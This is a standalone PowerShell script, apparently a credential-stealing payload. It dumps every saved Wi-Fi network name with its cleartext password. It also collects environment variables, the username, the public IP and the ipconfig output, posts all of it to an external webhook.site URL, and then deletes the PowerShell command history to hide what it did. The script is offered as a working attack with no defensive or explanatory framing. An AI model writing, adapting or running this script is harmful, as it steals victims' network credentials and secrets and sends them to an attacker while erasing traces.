$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
  $_.Matches.Value
}

$wifis = @()

foreach ($profile in $profiles) {
  $password = netsh wlan show profile $profile key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object {
    $_.Matches.Value.Trim()
  }
  $wifis += @{
    'name' = $profile
    'password' = $password
  }
}
$IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$IPconfig = (ipconfig /all)
$envVars = @{}
gci env:* | ForEach-Object {
  $envVars[$_.Name] = $_.Value
}

$Body = @{
  'username' = $env:username
  'wifi_profiles' = $wifis
  'env' = $envVars
  // | ConvertTo-Json
  'ipv4' = $IPV4
  'ipconfig' = $IPconfig
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item (Get-PSReadlineOption).HistorySavePath
